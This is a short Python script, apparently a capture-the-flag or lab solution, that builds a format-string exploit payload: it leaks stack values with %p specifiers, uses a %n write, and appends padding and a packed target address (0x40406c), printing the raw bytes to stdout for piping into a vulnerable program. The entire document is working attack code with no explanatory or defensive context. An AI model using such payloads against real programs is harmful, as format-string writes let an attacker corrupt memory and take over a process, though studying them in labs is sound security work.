import struct, sys

fmt = b"%6$p %7$p %8$p %9$n\n"
padding = b"A"*4 #not 8 cuz it took over half of the arg
bug_addr = struct.pack("<Q", 0x40406c)

payload = fmt + padding + bug_addr 
sys.stdout.buffer.write(payload) #write as bytes
